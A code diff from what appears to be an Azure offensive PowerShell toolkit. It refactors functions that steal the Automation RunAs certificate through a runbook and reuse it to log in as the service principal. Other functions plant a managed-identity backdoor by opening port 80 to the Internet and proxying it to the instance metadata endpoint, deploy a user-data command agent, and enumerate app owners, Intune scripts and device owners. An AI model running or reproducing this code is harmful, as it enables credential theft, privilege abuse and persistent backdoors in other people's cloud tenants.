-		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunShellScript -ScriptPath "./test1.sh"' | Out-File -Append BashAutomationTutorial.sh
-		$data7 = '$z.Value[0].Message' | Out-File -Append BashAutomationTutorial.sh
-		Write-Host "Uploading Runbook..." -ForegroundColor Green
-		Import-AzAutomationRunbook -Path .\BashAutomationTutorial.sh -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
+			$value
+			Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell -Force
+			rm $RunbookPath
+		}
+		else
+		{
+			$RunbookPath = Join-Path $TempPath 'BashAutomationTutorial.sh'
+			$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append $RunbookPath
+			$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append $RunbookPath
+			$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append $RunbookPath
+			$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append $RunbookPath
+			$data4 = 'New-Item test.sh' | Out-File -Append $RunbookPath
+			$data5 = "echo $Command >> test.sh" | Out-File -Append $RunbookPath
+			$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunShellScript -ScriptPath "./test1.sh"' | Out-File -Append $RunbookPath
+			$data7 = '$z.Value[0].Message' | Out-File -Append $RunbookPath
+			Write-Host "Uploading Runbook..." -ForegroundColor Green
+			Import-AzAutomationRunbook -Path $RunbookPath -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
 		Write-Host "Publishing Runbook..." -ForegroundColor Green
 		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial
 		Write-Host "Starting Runbook..." -ForegroundColor Green
@@ -1308,12 +1427,12 @@ function Invoke-AzureCommandRunbook
 			$value = $record.Value[2].value
 
 		}
-		$value
-		$timer.Stop()
-		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial -Force
-		rm BashAutomationTutorial.sh
+			$value
+			$timer.Stop()
+			Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial -Force
+			rm $RunbookPath
+		}
 	}
-}
 
 function New-AzureBackdoor
 {
@@ -1406,17 +1525,19 @@ function Get-AzureRunAsCertificate
     $CurrentUser = Get-AzContext
     $AA = Get-AzAutomationAccount | Where-Object {$_.AutomationAccountName -eq "$AutomationAccount"}   
     $name = $AA.AutomationAccountName
-    $AppData = Get-AzADApplication | Where-Object {$_.DisplayName -match "$name"}
-    $ResourceGroup = $AA.ResourceGroupName
-	$data1 = '$RunAsCert = Get-AutomationCertificate -Name "AzureRunAsCertificate"' | Out-File  AutomationTutorialPowerShell.ps1 -Force
-	$data2 = '$CertPath = Join-Path $env:temp  "AzureRunAsCertificate.pfx"' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data3 = '$Cert = $RunAsCert.Export("pfx",$Password)' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data4 = '$Password = "YourStrongPasswordForTheCert" ' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data5 = 'Set-Content -Value $Cert -Path $CertPath -Force -Encoding Byte | Write-Verbose' | Out-File -Append AutomationTutorialPowerShell.ps1
-    $data6 = '$RunAsCert' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data6 = '[Convert]::ToBase64String([IO.File]::ReadAllBytes($CertPath))' | Out-File -Append AutomationTutorialPowerShell.ps1
-	Write-Host "Uploading Runbook..." -ForegroundColor Green
-	Import-AzAutomationRunbook -Path .\AutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
+	    $AppData = Get-AzADApplication | Where-Object {$_.DisplayName -match "$name"}
+	    $ResourceGroup = $AA.ResourceGroupName
+	    $TempPath = [System.IO.Path]::GetTempPath()
+	    $RunbookPath = Join-Path $TempPath 'AutomationTutorialPowerShell.ps1'
+		$data1 = '$RunAsCert = Get-AutomationCertificate -Name "AzureRunAsCertificate"' | Out-File $RunbookPath -Force
+		$data2 = '$CertPath = Join-Path $env:temp  "AzureRunAsCertificate.pfx"' | Out-File -Append $RunbookPath
+		$data3 = '$Cert = $RunAsCert.Export("pfx",$Password)' | Out-File -Append $RunbookPath
+		$data4 = '$Password = "YourStrongPasswordForTheCert" ' | Out-File -Append $RunbookPath
+		$data5 = 'Set-Content -Value $Cert -Path $CertPath -Force -Encoding Byte | Write-Verbose' | Out-File -Append $RunbookPath
+    $data6 = '$RunAsCert' | Out-File -Append $RunbookPath
+		$data6 = '[Convert]::ToBase64String([IO.File]::ReadAllBytes($CertPath))' | Out-File -Append $RunbookPath
+		Write-Host "Uploading Runbook..." -ForegroundColor Green
+		Import-AzAutomationRunbook -Path $RunbookPath -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
 	Write-Host "Publishing Runbook..." -ForegroundColor Green
 	Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell| Out-Null
 	Write-Host "Starting Runbook..." -ForegroundColor Green
@@ -1433,24 +1554,23 @@ function Get-AzureRunAsCertificate
 	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
 	}
 	$timer.Stop()	
-    $thumbprint = $record.Value.Thumbprint
-	$tenant = $CurrentUser.Tenant.Id
-	$appID = $AppData.ApplicationId
-	$b64 = $record.Value.value
-	New-item AzureRunAsCertificate.pfx -Force | Out-Null
-	$Password = "YourStrongPasswordForTheCert"
-	$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
-	$d = pwd
-	$CertPath = $d.Path + "\AzureRunAsCertificate.pfx"
-	[IO.File]::WriteAllBytes($CertPath, [Convert]::FromBase64String($b64))
+	    $thumbprint = $record.Value.Thumbprint
+		$tenant = $CurrentUser.Tenant.Id
+		$appID = $AppData.ApplicationId
+		$b64 = $record.Value.value
+		$Password = "YourStrongPasswordForTheCert"
+		$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+		$CertPath = Join-Path $TempPath 'AzureRunAsCertificate.pfx'
+		New-item $CertPath -Force | Out-Null
+		[IO.File]::WriteAllBytes($CertPath, [Convert]::FromBase64String($b64))
 	Write-Host "Importing Certificate" -ForegroundColor Green
 	$import = Import-PfxCertificate -FilePath $CertPath -CertStoreLocation Cert:\LocalMachine\My -Password $SecurePassword -Exportable
 	Write-Host "Done! To login as the service principal, copy+paste the following command: " -ForegroundColor Green
-	Write-Host ""
-	Write-Host "Connect-AzAccount -CertificateThumbprint "$thumbprint" -ApplicationId "$appID" -Tenant "$tenant"" -ForegroundColor Green
-	Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell -Force
-	rm AutomationTutorialPowerShell.ps1
-}
+		Write-Host ""
+		Write-Host "Connect-AzAccount -CertificateThumbprint "$thumbprint" -ApplicationId "$appID" -Tenant "$tenant"" -ForegroundColor Green
+		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell -Force
+		rm $RunbookPath
+	}
 
 function Get-AzureSQLDB
 {
@@ -1575,17 +1695,16 @@ Get-AzureAppOwners
 #>
     $Headers = Get-AzureToken -Graph
 	$Uri = 'https://graph.microsoft.com/beta/applications'
-	$appdata = Invoke-RestMethod -Headers $Headers -Uri $Uri
-	$apps = $appdata.value
+	$apps = Invoke-GraphRequestPaged -Headers $Headers -Uri $Uri
 	ForEach($app in $apps)
 	{
 		$id = $app.id
-		$Owners = Invoke-RestMethod -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$id/owners"
-		If($Owners.value.userPrincipalName)
+		$Owners = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$id/owners"
+		If($Owners.userPrincipalName)
 		{
             $obj = New-Object -TypeName psobject
             $obj | Add-Member -MemberType NoteProperty -Name AppName -Value $app.DisplayName
-            $obj | Add-Member -MemberType NoteProperty -Name OwnerName -Value $Owners.value.userPrincipalName
+            $obj | Add-Member -MemberType NoteProperty -Name OwnerName -Value $Owners.userPrincipalName
             $obj
 		}
 	}
@@ -1787,10 +1906,13 @@ function Get-AzureIntuneScript
 	Get-AzureInTuneScript
 #>
     If(!$GraphToken){
-        Get-AzureToken
+        $Headers = Get-AzureToken -Graph
     }
-    $Headers = @{}
-    $Headers.Add("Authorization","Bearer"+ " " + "$($GraphToken)")    
+    else{
+        $GraphTokenValue = ConvertFrom-SecureStringToken -Token $GraphToken
+        $Headers = @{}
+        $Headers.Add("Authorization","Bearer"+ " " + "$GraphTokenValue")
+    }    
     $req = Invoke-RestMethod -uri "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" -Headers $Headers
     $req.value
 }
@@ -1865,15 +1987,14 @@ function Get-AzureDeviceOwner
 	Get-AzureDeviceOwner
 #>
     $Headers = Get-AzureToken -Graph
-    $req = Invoke-RestMethod -uri https://graph.microsoft.com/v1.0/devices -Headers $Headers
-    $devices = $req.value
+    $devices = Invoke-GraphRequestPaged -Uri https://graph.microsoft.com/v1.0/devices -Headers $Headers
     ForEach($device in $devices){
         $id = $device.id
-        $ownerreq = Invoke-RestMethod -uri https://graph.microsoft.com/v1.0/devices/$id/registeredOwners -Headers $Headers
-        $ownerid = $ownerreq.value.id
+        $ownerreq = Invoke-GraphRequestPaged -Uri https://graph.microsoft.com/v1.0/devices/$id/registeredOwners -Headers $Headers
+        $ownerid = $ownerreq.id
         If($Ownerid){
-            $ownerDN = $ownerreq.value.displayName
-            $ownerUPN = $ownerreq.value.userPrincipalName
+            $ownerDN = $ownerreq.displayName
+            $ownerUPN = $ownerreq.userPrincipalName
             $AzureDeviceOwner = [PSCustomObject]@{
                 DeviceDisplayname   = $Device.Displayname
                 DeviceID            = $Device.id
@@ -1881,7 +2002,7 @@ function Get-AzureDeviceOwner
                 OSVersion           = $device.operatingSystemVersion
                 OwnerDisplayName    = $ownerDN
                 OwnerID             = $Ownerid
-                OwnerType           = $Ownerreq.value.'@odata.type'
+                OwnerType           = $Ownerreq.'@odata.type'
                 OwnerUPN            = $ownerUPN       
             }
             $AzureDeviceOwner
@@ -1922,14 +2043,14 @@ function Invoke-AzureMIBackdoor
 	$id = $sp.id	
 	$roleadd = New-AzRoleAssignment -ObjectId $id -RoleDefinitionName $role -Scope $scope
 	If($roleadd){
-		If($NoRDP){
-			$NSG = Get-AzNetworkSecurityGroup -Name $VM*
-			Add-AzNetworkSecurityRuleConfig -Access Allow -DestinationAddressPrefix * -DestinationPortRange 80 -Direction Inbound -Name HTTP -Priority 101 -Protocol Tcp -SourceAddressPrefix 'Internet' -SourcePortRange * -NetworkSecurityGroup $NSG | Set-AzNetworkSecurityGroup
-			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=80 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
-			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
-			$path = $new.DirectoryName + '\' + $new.Name 
-			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
-			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
+			If($NoRDP){
+				$NSG = Get-AzNetworkSecurityGroup -Name $VM*
+				Add-AzNetworkSecurityRuleConfig -Access Allow -DestinationAddressPrefix * -DestinationPortRange 80 -Direction Inbound -Name HTTP -Priority 101 -Protocol Tcp -SourceAddressPrefix 'Internet' -SourcePortRange * -NetworkSecurityGroup $NSG | Set-AzNetworkSecurityGroup
+				$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=80 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
+				$new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $Command -Force
+				$path = $new.FullName 
+				Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
+				$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
 			rm $path
 			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
 				$name = $VM + '*-ip'
@@ -1947,12 +2068,12 @@ function Invoke-AzureMIBackdoor
 					}	
 				}			
 			}	
-		else{
-			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
-			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
-			$path = $new.DirectoryName + '\' + $new.Name 
-			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
-			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
+			else{
+				$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
+				$new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $Command -Force
+				$path = $new.FullName 
+				Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
+				$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
 			rm $path
 			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
 			$name = $VM + '*-ip'
@@ -2014,8 +2135,8 @@ function Get-AzureManagedIdentity
     Gathers all Managed Identities in Entra
 #>
 	$Headers = Get-AzureToken -Graph 
-    $req = Invoke-RestMethod -Uri 'https://graph.microsoft.com/beta/servicePrincipals' -Headers $Headers
-    $req.value | where-object {$_.ServicePrincipalNames -match 'https://identity.azure.net'} | Select-Object -Property DisplayName, appId, AlternativeNames
+    $req = Invoke-GraphRequestPaged -Uri 'https://graph.microsoft.com/beta/servicePrincipals' -Headers $Headers
+    $req | where-object {$_.ServicePrincipalNames -match 'https://identity.azure.net'} | Select-Object -Property DisplayName, appId, AlternativeNames
 
 }
 
@@ -2041,8 +2162,9 @@ function Invoke-AzureVMUserDataCommand
 	$Resource = Get-AzResource -Name $VM
 	$ResourceID = $Resource.ResourceId
 	$Headers = @{}
-    $Headers.Add("Authorization","Bearer $($token.token)") 
-	$FullCommand = $Command + '%' + $token.token + '%' + $ResourceID
+    $TokenValue = ConvertFrom-SecureStringToken -Token $token.token
+    $Headers.Add("Authorization","Bearer $TokenValue") 
+	$FullCommand = $Command + '%' + $TokenValue + '%' + $ResourceID
 	$Bytes = [System.Text.Encoding]::Unicode.GetBytes($FullCommand)
 	$EncodedText =[Convert]::ToBase64String($Bytes)
 	$json = '{"properties": { "userData": ' + '"' + $EncodedText + '",	}}'
@@ -2102,9 +2224,9 @@ $Uri = 'https://management.azure.com/' + $split[2] + '?api-version=2021-07-01'
 $RestMethod = Invoke-RestMethod -Method PATCH -Uri $uri -Body $Json -Header $Headers -ContentType 'application/json'}
 rm C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.9\Downloads\*
 '@
-	$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $data
-	$path = $new.DirectoryName + '\' + $new.Name 
-	Write-Host "Uploading Agent..." -ForegroundColor Yellow
+		$new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $data
+		$path = $new.FullName 
+		Write-Host "Uploading Agent..." -ForegroundColor Yellow
 	$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
 	If($change){
 		Write-Host "Agent successfully deployed!" -Foregroundcolor Green
